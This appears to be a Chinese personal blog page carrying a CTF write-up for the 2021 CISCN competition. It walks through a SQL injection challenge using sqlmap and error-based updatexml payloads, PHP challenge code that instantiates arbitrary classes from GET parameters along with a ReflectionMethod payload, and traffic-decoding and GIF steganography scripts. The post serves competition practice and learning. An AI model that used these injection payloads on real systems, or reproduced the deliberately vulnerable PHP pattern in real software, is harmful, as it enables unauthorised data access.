@@ -1,0 +1,807 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://image.0error.net/favicon.png">
+  <link rel="icon" href="https://image.0error.net/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jason">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="WriteUp - Maple_root -CISCN2021总结总得分：3400 总排名：203 赛区排名：21 第一次认真参加正式的CTF，24+3小时的脑血栓比赛时长，收获还是很多的。 开卷WEBeasy_sqlSqlmap -r &#x2F;root&#x2F;wordlist&#x2F;table.txt -p uname -D security --tablesSqlmap直接跑出两张表(flag, user)单跑">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2021-第十四届全国大学生信息安全竞赛-WriteUp">
+<meta property="og:url" content="https://www.0error.net/2021/05/6c0728af.html">
+<meta property="og:site_name" content="Jason Chen&#39;s Blog">
+<meta property="og:description" content="WriteUp - Maple_root -CISCN2021总结总得分：3400 总排名：203 赛区排名：21 第一次认真参加正式的CTF，24+3小时的脑血栓比赛时长，收获还是很多的。 开卷WEBeasy_sqlSqlmap -r &#x2F;root&#x2F;wordlist&#x2F;table.txt -p uname -D security --tablesSqlmap直接跑出两张表(flag, user)单跑">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/05/16/lseWVX7Uu61Gwzi.png">
+<meta property="article:published_time" content="2021-05-17T07:17:55.000Z">
+<meta property="article:modified_time" content="2023-11-08T04:25:37.533Z">
+<meta property="article:author" content="Jason">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="CISCN">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.loli.net/2021/05/16/lseWVX7Uu61Gwzi.png">
+  
+  
+  
+  <title>CISCN2021-第十四届全国大学生信息安全竞赛-WriteUp - Jason Chen&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.0error.net","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":200}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"bad56014d4869a580f4ebb27cf549354","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?bad56014d4869a580f4ebb27cf549354";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Jiajun Chen&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://image.0error.net/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CISCN2021-第十四届全国大学生信息安全竞赛-WriteUp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-05-17 15:17" pubdate>
+          2021年5月17日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          全文共有 19k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          阅读全文预计需要 160 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CISCN2021-第十四届全国大学生信息安全竞赛-WriteUp</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年11月8日 中午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="WriteUp-Maple-root-CISCN2021"><a href="#WriteUp-Maple-root-CISCN2021" class="headerlink" title="WriteUp - Maple_root -CISCN2021"></a>WriteUp - Maple_root -CISCN2021</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总得分：3400</p>
+<p>总排名：203</p>
+<p>赛区排名：21</p>
+<p>第一次认真参加正式的CTF，24+3小时的脑血栓比赛时长，收获还是很多的。</p>
+<h2 id="开卷"><a href="#开卷" class="headerlink" title="开卷"></a>开卷</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h4><p><code>Sqlmap -r /root/wordlist/table.txt -p uname -D security --tables</code><br>Sqlmap直接跑出两张表(flag, user)<br>单跑不出列名<br>回去找到sqlmap的payload<br><code>uname=admin&#39;) RLIKE (SELECT (CASE WHEN (7431=7431) THEN 0x61646d696e ELSE 0x28 END))-- WQuk&amp;passwd=admin&amp;Submit=%E7%99%BB%E5%BD%95</code><br>修改payload<br><code>Admin’)||updatexml(1,((select * from (select * from flag as a join flag as b ) as c limit 1,1)),1)%23</code><br>爆出第一个列id<br><code>Admin’)||updatexml(1,((select * from (select * from flag as a join flag as b using(id)) as c limit 1,1)),1)%23</code><br>爆出第二个列no<br><code>Admin’)||updatexml(1,((select * from (select * from flag as a join flag as b using(id，no)) as c limit 1,1)),1)%23</code><br>爆出最后一列<code>fec74227-42d6-4636-a0d4-92f8a913vfd6</code><br>最后查询出flag</p>
+<h4 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h4><p>扫描找到.index.php.swo，得到index.php源码。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span></span><br><span class="hljs-class"><span class="language-php"></span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">j</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">k</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">m</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">n</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">o</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">r</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">t</span>(<span class="hljs-params"></span>)</span></span><br><span class="hljs-function"><span class="language-php">    </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">    </span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$rc</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rc&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$rb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rb&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$ra</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;ra&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$rd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;rd&quot;</span>];</span><br><span class="language-php"><span class="hljs-variable">$method</span>= <span class="hljs-keyword">new</span> <span class="hljs-variable">$rc</span>(<span class="hljs-variable">$ra</span>, <span class="hljs-variable">$rb</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$method</span>-&gt;<span class="hljs-variable">$rd</span>());</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure>
+
+<p>构造ReflectionMethod类遍历a-t方法的注释，payload：<code>?ra=User&amp;rb=a&amp;rc=ReflectionMethod&amp;rd=getDocComment</code>。<br>其中一个方法注释中包含flag。</p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny_traffic"></a>tiny_traffic</h4><p>分析流量，导出全部http对象。<br>在python中使用brotli解码test和secret。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> brotli<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">file_name</span>):<br>    out = <span class="hljs-built_in">open</span>(file_name + <span class="hljs-string">&quot;_extracted&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>    out.write(brotli.decompress(<span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&quot;rb&quot;</span>).read()))<br>    out.close()<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    extract(<span class="hljs-string">&quot;secret&quot;</span>)<br>    extract(<span class="hljs-string">&quot;test&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>test为一个proto文件，内容为：</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">PBResponse</span> &#123;<br>  <span class="hljs-type">int32</span> code = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int64</span> flag_part_convert_to_hex_plz = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">message </span><span class="hljs-title class_">data</span> &#123;<br>    <span class="hljs-type">string</span> junk_data = <span class="hljs-number">2</span>;<br>    <span class="hljs-type">string</span> flag_part = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">repeated</span> data dataList = <span class="hljs-number">3</span>;<br>  <span class="hljs-type">int32</span> flag_part_plz_convert_to_hex = <span class="hljs-number">4</span>;<br>  <span class="hljs-type">string</span> flag_last_part = <span class="hljs-number">5</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">PBRequest</span> &#123;<br>  <span class="hljs-type">string</span> cate_id = <span class="hljs-number">1</span>;<br>  <span class="hljs-type">int32</span> page = <span class="hljs-number">2</span>;<br>  <span class="hljs-type">int32</span> pageSize = <span class="hljs-number">3</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>猜测secret为PBResponse Message，使用protoc解码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">protoc --decode=PBResponse ./test_extracted &lt; ./secret_extracted</span><br>code: 200<br>flag_part_convert_to_hex_plz: 15100450<br>dataList &#123;<br>  flag_part: &quot;e2345&quot;<br>  junk_data: &quot;7af2c&quot;<br>&#125;<br>dataList &#123;<br>  flag_part: &quot;7889b0&quot;<br>  junk_data: &quot;82bc0&quot;<br>&#125;<br>flag_part_plz_convert_to_hex: 16453958<br>flag_last_part: &quot;d172a38dc&quot;<br></code></pre></td></tr></table></figure>
+<p>忽略junk_data，部分提示转换字段转为hex后拼接得到flag。</p>
+<h4 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h4><p>导出gif全部关键帧，在最后几帧发现异常白点，ps取色为rgb(233,233,233)。<br><img src="https://i.loli.net/2021/05/16/lseWVX7Uu61Gwzi.png" srcset="/img/loading.gif" lazyload><br>因与背景色rgb(247,247,247)过于相近，怀疑存在隐写。<br>使用python将所有关键帧中的(233,233,233)像素点在同等大小的画布上画成黑色，每画一下保存一张关键帧。    </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> time<br><br>out = Image.new(<span class="hljs-string">&quot;L&quot;</span>, (<span class="hljs-number">400</span>,<span class="hljs-number">400</span>), <span class="hljs-number">255</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">383</span>):<br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>).convert(<span class="hljs-string">&quot;RGB&quot;</span>)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">1</span>]):<br>            p = img.getpixel((x,y))<br>            <span class="hljs-keyword">if</span> p == (<span class="hljs-number">233</span>,<span class="hljs-number">233</span>,<span class="hljs-number">233</span>):<br>                <span class="hljs-built_in">print</span>(i,x,y)<br>                out.putpixel((y,x), <span class="hljs-number">0</span>)<br>                out.save(<span class="hljs-string">f&quot;out<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>                <br>out.save(<span class="hljs-string">f&quot;out<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>.png&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>从头逐一切换图片，观察到黑色像素画出flag。</p>
